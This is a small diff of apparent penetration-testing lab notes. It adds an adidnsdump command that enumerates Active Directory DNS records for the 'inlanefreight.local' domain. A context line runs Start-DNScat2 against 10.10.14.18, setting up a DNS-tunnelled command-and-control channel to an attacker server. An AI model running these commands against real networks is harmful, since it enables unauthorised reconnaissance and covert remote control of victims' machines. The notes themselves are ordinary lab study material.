@@ -52,5 +52,7 @@ Start-DNScat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
 ```
 ```
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r #tries to resolve unknown records 
+```
 
 # Post Exploitation 
